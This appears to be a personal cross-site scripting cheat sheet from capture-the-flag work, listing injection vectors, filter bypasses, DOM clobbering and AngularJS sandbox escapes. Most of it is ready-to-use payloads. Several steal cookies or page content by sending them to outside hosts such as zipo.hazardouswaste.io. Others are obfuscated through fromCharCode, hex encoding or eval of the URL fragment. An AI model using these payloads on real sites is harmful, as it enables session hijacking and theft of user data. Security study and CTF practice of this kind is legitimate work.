= Cross-Site Scripting (XSS)

== Tools

* Hackbar
* Web developer tool
* Python: urllib.quote, 

== Good to know

* svg tag is very useful for firing javascript events

== Injection Vectors

In unfiltered input (remember that X-XSS-Protection might prevent such
payloads to work in modern browsers, in doubt try with curl)

    <script>alert(1)</script>

=== In HTML attribute

    <img src=javascript:alert(1) />

Add new HTML attributes

    <body bgcolor='..' onload='new Image().src=String.fromCharCode(104,116,116,...)+document.cookie'>
                     ^ injection

In input tag:

    onfocus="alert('XSS')" autofocus

in style attributes:

    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
    test" style="background-image: url(http://rochefort.bottomlesspit.org:8080/xss3);

In cookies that are getting showed up on the page

=== Persistent

via databases, redis, etc.

=== In data-uri

I've done this with embed tags.

Cookies are not accessible inside data-uri.

Use MIME type text/html and use base64 with <script> tags or use svg with
something like:

    MIME: image/svg+xml

    <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss">
    <script type="text/ecmascript">
    document.location = 'http://rochefort.bottomlesspit.org:8080/xss
    </script></svg>

== Anti-filtering

spaces replaced by something else:: use tabs (%09)

Injection is limited in number of characters that we are able to inject. Put
the payload in URL fragment (after #) and eval it:

    eval(location.hash.substr(1))

script tags filtering: put html with javascript events

    <img src="http://zipo.hazardouswaste.io:6666/a.gif" onerror="document.write( ... )">

Hex encode bypasses several types of filters:

    http://echo.ctf/?name=\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x22\x61\x73\x64\x66\x22\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x27\x6e\x65\x77\x20\x49\x6d\x61\x67\x65\x28\x29\x2e\x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x6f\x6c\x6e\x2e\x6d\x61\x72\x63\x65\x74\x69\x65\x6e\x6e\x65\x2e\x63\x6f\x6d\x2f\x63\x74\x66\x3f\x22\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x27\x3e

Javascript fancy'ness

    window["String"]["fromCharCode"](104,116,116,112,58,47,47,109,111,108,110,46,109,97,114,99,101,116,105,101,110,110,101,46,99,111,109,47,99,116,102,63)

and more

    window["Str"+"ing"]["fromCh"+"arCode"](104,116,116,112,58,47,47,109,111,108,110,46,109,97,114,99,101,116,105,101,110,110,101,46,99,111,109,47,99,116,102,63)

* HTML Entities don't work in script tags
* HTML Entities need to be URL-encoded

== Payloads

Simple cookie exfil in redirect:

    <script>document.location = 'http://192.168.0.110:3306/a.gif?x=' + encode(document.cookie)</script>

Simple cookie exfil in image loading:

    document.write("<img src='http://zipo.hazardouswaste.io:3306/a.gif?x=" + escape(document.cookie) + "'>");

Hackbar to String.fromCharCode and wrap in eval():

    <script>eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 39, 104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 56, 46, 48, 46, 49, 49, 48, 58, 51, 51, 48, 54, 47, 63, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101))</script>

XMLHttpRequest that fetches a page on same domain as target and exfiltrate its
content:

----
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET","http://snitch.ctf/debug.php",true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        bd = xhr.responseText;
        document.write("<img src='http://zipo.hazardouswaste.io:3306/a.gif?x=" + escape(bd) + "'>");
    }
    return xhr.readyState;
}
xhr.send();
</script>
----

== Perform a POST-based XSS

HTML with auto-submitting form. Didn't work on PhantomJS headless browser.
Next time we should try a sleep after the form submit to see if the thing
works in PhantomJS.

Escape any raw `<script>` tags sent by splitting them in Javascript:

    '<scr' + 'ipt>'

See `submit.html` for a sample form.

== Things to think about

* HTML Entity encoding
* Hex-encoding
* URL encoding
* Escaping things
* Splitting things (ex: '<scr' + 'ipt>')
* document.write('<script>...') will not trigger scripts. Insert html with
  events (onload, onerror, etc.) instead.
* Places where you can put javascript code
** attributes
** <script tags>
** #... with a limited injection with an eval: eval(location.hash.substr(1))
* Data URIs
* Behavior of the fake browser (follows redirects, executes all javascript, detaches when page is first rendered)

== Advanced techniques

=== DOM Clobbering

* http://www.thespanner.co.uk/2013/05/16/dom-clobbering/
* http://holyvier.blogspot.ca/2015/05/northsec-xss-challenge-writeups.html
* http://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream

vulnerable

    form method="$FILTERED_USER_INPUT"
    ...
    document.write(document.body.id)

to exploit

    method=get%20name=body+id=PAYLOAD
    form method=

==== Another example

Final payload

    https://xss.lol/domclob1/?formClass=red%20name=clientInfo%20id=%27%22/%3E%20%3Cimg%20src=xx%20onerror=alert(1)%20/%3E%27&test=%3Cscript%3E%20var%20simpleDate%20=%20{year:%272016%27,month:%2705%27,day:%2727%27};%20var%20clientInfo%20=%20{%22id%22:%22guest79424926%22,%22userName%22:%22Guest%22};%20%3C/script%3E

This piece is to cancel javascript in the header by triggering a false case of
XSS Auditor:

    test=%3Cscript%3E%20var%20simpleDate%20=%20{year:%272016%27,month:%2705%27,day:%2727%27};%20var%20clientInfo%20=%20{%22id%22:%22guest79424926%22,%22userName%22:%22Guest%22};%20%3C/script%3E

Clobbering happens on the formClass GET variable. We inject so that
`clientInfo.id` is replaced by stuff we control.

Vulnerable code:

    document.getElementById("trackerDiv").innerHTML = "<img src=\"tracker.gif?client="+clientInfo.id+"&page=feedback\">";

Payload

    ?formClass=red%20name=clientInfo%20id=%27%22/%3E%20%3Cimg%20src=xx%20onerror=alert(1)%20/%3E%27


=== Angular JS

* Template injection: `{{ 1338 - 1 }}`
* DOM XSS: $sce.trustAsHtml(userHtml) 
* Look for these which don't escape: <div ng-bind-html-unsafe="userHtml">{{ template }}</div>
* http://gosecure.github.io/security-cheat-sheet/

== Sandbox escape payloads:

* Version: 1.0.1 - 1.1.5

    {{constructor.constructor('alert(1)')()}}

* Version: 1.2.6 - 1.2.18

    {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

* http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html

=== jQuery

Use getScript API: http://api.jquery.com/jQuery.getScript/

Ex:

    onmouseover=%22$[`getS`%2B`cript`]`//example.com`

Avoids (, ), script and '.

